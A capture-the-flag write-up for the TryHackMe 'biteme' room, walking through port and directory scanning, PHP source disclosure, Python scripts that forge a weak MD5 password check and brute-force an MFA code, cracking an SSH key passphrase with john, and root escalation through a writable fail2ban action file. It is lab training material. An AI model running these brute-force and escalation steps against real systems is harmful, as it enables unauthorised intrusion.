<p align="center">
  THM : biteme<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/biteme<br>
  <img src="https://i.imgur.com/GYGbZOD.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Web enumeration](#web-enumeration)
- [Get valid credentials](#get-valid-credentials)
- [MFA bruteforce](#mfa-bruteforce)
- [Getting a shell](#getting-a-shell)
- [Linux enumeration](#linux-enumeration)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's use [nmap](https://nmap.org/book/man.html) to scan the target for open ports and services :  
```
attacker@AttackBox:~/biteme$ nmap 10.10.59.32 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-13 10:35 CET
Nmap scan report for 10.10.59.32
Host is up (0.037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.92 seconds
```

## Web enumeration

Let's see if [gobuster](https://github.com/OJ/gobuster) can find interesting files or directories on port 80 :  
```
attacker@AttackBox:~/biteme$ gobuster dir -u http://10.10.59.32/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.59.32/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/03/13 10:40:59 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/console              (Status: 301) [Size: 312] [--> http://10.10.59.32/console/]
/server-status        (Status: 403) [Size: 276]
Progress: 20435 / 20470 (99.83%)
===============================================================
2023/03/13 10:42:08 Finished
===============================================================
```

We found a directory named `console`. Let's take a look at it using a web browser :  
![](https://i.imgur.com/YWt1GPW.png)  

There is a login form with a captcha. It will be more complicated to try to brute force this login form. Let's take a look at the source code :  
![](https://i.imgur.com/iR7yzwP.jpg)  

There is an interesing thing about this website, we can see the PHP source code by adding `s` to the page extension. For example :  
![](https://i.imgur.com/48nE4V4.jpg)  

We can see `functions.php` is included in this php code. Let's take a look at it :  
![](https://i.imgur.com/xZpnwtb.jpg)  

We can see the password is considered as valid when the last 3 characters of the MD5 hash are `001`. So we know how to have a valid password. Now we need 
a username. Let's take a look at `config.php` :  
![](https://i.imgur.com/v1TNhCU.jpg)  

## Get valid credentials

So this string is the username in hexadecimal format. Let's decode it :  
![](https://i.imgur.com/LFUofoo.jpg)  

Now we have a valid username. We still need a valid password. Let's write a python script to generate MD5 hashes and find one that finish with `001` :  
```
#!/usr/bin/python3

import hashlib
import string
from itertools import chain, product

def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

for attempt in bruteforce(string.ascii_lowercase, 10):
    hash = hashlib.md5(attempt.encode('utf-8'))
    if hash.hexdigest().endswith("001"):
        print("Valid password :",attempt)
        break
```

Let's run this script :  
```
attacker@AttackBox:~/biteme$ python3 script.py 
Valid password : fca
```

Now we have a valid password ! Let's try the credentials we have now :  
![](https://i.imgur.com/pqjG733.jpg)  

After login, we are redirected to this page :  
![](https://i.imgur.com/gaAZ8ws.jpg)  

## MFA bruteforce

Let's try to bruteforce this code using [BurpSuite](https://portswigger.net/burp). We need to capture the request to this page :  
![](https://i.imgur.com/LJisGiZ.jpg)  

So we have the parameter name `code`. We can try to use [BurpSuite](https://portswigger.net/burp)'s Intruder but it will be way too slow... So let's write a python script :  
```
#!/usr/bin/python3

import requests

url = 'http://10.10.59.32/console/mfa.php'
code = 1000
cookies = {"user": "jason_test_account", "pwd":"fca"}

while True:
    data = {'code' : str(code)}
    r = requests.post(url, data = data, cookies = cookies)
    if "Incorrect code" not in r.text:
        print("The correct code is",code)
        break
    else:
        code = code + 1
```

Now let's run this script :  
```
attacker@AttackBox:~$ python3 brute_force_mfa.py 
The correct code is 2368
```

Let's try this code using our web browser :  
![](https://i.imgur.com/SpzHnrD.jpg)  

And we are redirected to this page :  
![](https://i.imgur.com/1qlHy1O.jpg)  

## Getting a shell

We can list files using the dashboard :  
![](https://i.imgur.com/KPektX6.jpg)  

After some basic enumeration, we can find an SSH private key for user `jason` :  
![](https://i.imgur.com/7cKpgas.jpg)  

Let's read this file :  
![](https://i.imgur.com/PBx3svQ.jpg)  

Now, we copy this private key in a file on our attacking host can try to login as `jason` via SSH :  
```
attacker@AttackBox:~$ nano id_rsa
attacker@AttackBox:~$ chmod 600 id_rsa 
attacker@AttackBox:~$ ssh jason@10.10.59.32 -i id_rsa 
The authenticity of host '10.10.59.32 (10.10.59.32)' can't be established.
ECDSA key fingerprint is SHA256:LUN+looYmYUOxGSevsjjzBu0HTTK/QKY0Rs1UEdKgWk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.59.32' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

We need a passphrase. Let's try to crack it with [john](https://www.openwall.com/john/doc/) :  
```
attacker@AttackBox:~$ ssh2john id_rsa > hash.txt
attacker@AttackBox:~$ /opt/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
1a2b3c4d         (id_rsa)     
1g 0:00:00:00 DONE (2023-03-13 12:58) 1.587g/s 7949p/s 7949c/s 7949C/s chevy1..charm
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have the passphrase. Now, let's try again :  
```
attacker@AttackBox:~$ ssh jason@10.10.59.32 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
jason@biteme:~$
```

We are now logged in as user `jason` !

## Linux enumeration

First, let's get the user flag :  
```
jason@biteme:~$ ls
user.txt
jason@biteme:~$ cat user.txt 
THM{****************************}
```

Let's take a look at our sudo rights :  
```
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

Since we don't have the password for user `jason`, we can only use sudo as fred. Let's run `/bin/bash` as user `fred` :  
```
jason@biteme:~$ sudo -u fred /bin/bash
fred@biteme:~$ whoami
fred
```

Now, let's see if we have more privileges :  
```
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
```

## Privilege escalation

If we have write privileges on configuration files of fail2ban, there is a way to escalate our privileges with it. Let's see if we have write permissions 
on fail2ban configuration files :  
```
fred@biteme:~$ find /etc -writable -ls 2>/dev/null
   156253      4 drwxrwxrwx   2 root     root         4096 Nov 13  2021 /etc/fail2ban/action.d
   142010      4 -rw-r--r--   1 fred     root         1420 Nov 13  2021 /etc/fail2ban/action.d/iptables-multiport.conf
```

We have write privileges on `/etc/fail2ban/action.d/iptables-multiport.conf`. Let's make a backup of this file first :  
```
fred@biteme:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
```

Now, we can edit the file to change `actionban` value :  
![](https://i.imgur.com/j677AY7.jpg)  

Then, we have to restart fail2ban service :  
```
fred@biteme:~$ sudo systemctl restart fail2ban
```

Let's see if `/bin/bash` has the SUID now :  
```
fred@biteme:/tmp$ ls /bin/bash 
/bin/bash
```

Yes ! Now let's get a root shell :  
```
fred@biteme:/tmp$ /bin/bash -p
bash-4.4# whoami
root
```

Now we can get the root flag :  
```
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 
THM{*********************************}
```

## Conclusion

In this room, we practiced :  
- Services and open ports enumeration using [nmap](https://nmap.org/book/man.html)
- Web enumeration using [gobuster](https://github.com/OJ/gobuster)
- Basic php code analysis
- Brute forcing 
- Basic linux enumeration
- Privilege escalation using fail2ban misconfiguration

Thanks for this room and thanks for reading my write ups !
